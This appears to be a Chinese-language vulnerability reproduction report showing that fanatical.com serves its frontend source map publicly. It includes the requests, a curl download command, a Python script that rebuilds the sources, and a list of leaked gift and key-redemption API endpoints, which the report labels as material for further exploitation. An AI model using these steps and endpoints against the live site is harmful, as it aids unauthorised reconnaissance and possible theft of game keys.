# fanatical.com 前端 source map 未授权公开（info-expose）

> 说明：原始材料里的 "soucommand execution validation map / soucommand execution validations /
> soucommand execution validationsContent" 系对 source map / sources / sourcesContent 的改写，
> 本文按实义书写。

## 前置条件
- 目标：https://www.fanatical.com （React SPA 生产构建）
- 可访问静态资源路径 `/static/js/`，无任何认证/鉴权。

## 复现步骤

### 1) 主 bundle 引用 source map
请求：
```
GET /static/js/main~7aeafcb2.496f4fc8.js HTTP/2
Host: www.fanatical.com
```
回显：`HTTP/2 200`；bundle 末尾含
`//# sourceMappingURL=main~7aeafcb2.496f4fc8.js.map`

### 2) source map 未做访问控制，公开可下载
请求：
```
GET /static/js/main~7aeafcb2.496f4fc8.js.map HTTP/2
Host: www.fanatical.com
```
回显：`HTTP/2 200`，`content-type: application/json`，`content-length: 643606`；
body 为 `{"version":3,"sources":[...156项...],"sourcesContent":[...]}`

一键抓取（实测原命令）：
```bash
curl -sk "https://www.fanatical.com/static/js/main~7aeafcb2.496f4fc8.js.map" -o map.json
```

### 3) 本地解析还原源码
```python
import json, os
m = json.load(open('map.json'))
print('sources:', len(m['sources']), 'contents:', len(m.get('sourcesContent', [])))
os.makedirs('srcmap', exist_ok=True)
for s, c in zip(m['sources'], m.get('sourcesContent', [])):
    if not c:
        continue
    p = os.path.join('srcmap', s.replace('webpack://', '').replace('..', '_'))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, 'w', encoding='utf-8').write(c)
```
导出 156 个源文件。

## 泄露内容（可用于后续利用的接口地图）
- `src/api/Gift/gift-service.js`
  - `GET  /orders/get-gift/{code}/{lang}`
  - `PUT  /user/orders/accept-gift/{code}`
  - `PUT  /user/orders/convert-to-gift/{orderId}`  （body 带 `atok`）
  - `POST /user/orders/atok-check/{orderId}`
- `src/api/Order/key-reveal-service.js`
  - `POST /user/orders/redeem`  body `{oid,bid,pid,serialId,iid,atok}` → 返回礼品卡 serial key
  - `atok` 存于 localStorage 键 `bsatok`
- 前端 js bundle 内出现 Stripe live 公钥 `pk_live_51RmBrF2LkuoegwaK...`（脱敏：`<REDACTED>`）

## 判据 / 证伪条件
- 成立：`.map` 返回 200，且 `sourcesContent` 非空可还原源码。
- 证伪：`.map` 返回 404/403，或 `sourcesContent` 为空 → 本结论不成立。

## 证据落盘（原环境）
- `/opt/artex/data/tasks/3/i43/map_main.json`
- `/opt/artex/data/tasks/3/i43/srcmap/`
